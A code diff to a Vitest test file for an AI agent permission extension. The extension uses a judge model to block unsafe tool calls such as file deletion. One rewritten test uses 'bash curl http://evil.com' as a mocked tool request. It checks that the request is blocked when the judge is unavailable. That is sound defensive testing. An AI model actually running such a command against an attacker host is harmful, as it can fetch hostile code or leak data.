@@ -151,6 +151,7 @@ describe("my-permission extension entry", () => {
     vi.mocked(createJudge).mockReturnValue(
       vi.fn().mockResolvedValue({
         safe: false,
+        score: 3,
         reason: "potentially destructive",
         toolFor: "delete files",
       }),
@@ -168,7 +169,7 @@ describe("my-permission extension entry", () => {
     );
     expect(result).toEqual({
       block: true,
-      reason: "potentially destructive",
+      reason: "User denied: potentially destructive",
     });
   });
 
@@ -177,6 +178,7 @@ describe("my-permission extension entry", () => {
     vi.mocked(createJudge).mockReturnValue(
       vi.fn().mockResolvedValue({
         safe: false,
+        score: 2,
         reason: "unsafe in child",
         toolFor: "dangerous operation",
       }),
@@ -198,10 +200,14 @@ describe("my-permission extension entry", () => {
     });
   });
 
-  it("blocks when no judge result and no UI", async () => {
+  it("blocks when judge fails and no UI", async () => {
     vi.mocked(decide).mockReturnValue({ action: "ask", source: "defaultPolicy" });
     vi.mocked(createJudge).mockReturnValue(
-      vi.fn().mockResolvedValue(undefined),
+      vi.fn().mockResolvedValue({
+        safe: false,
+        reason: "未找到可用的法官模型，请手动确认",
+        toolFor: "bash curl http://evil.com",
+      }),
     );
 
     const api = createMockApi();
@@ -215,7 +221,7 @@ describe("my-permission extension entry", () => {
     );
     expect(result).toEqual({
       block: true,
-      reason: "Denied in non-interactive or subagent session",
+      reason: "未找到可用的法官模型，请手动确认",
     });
   });
 });
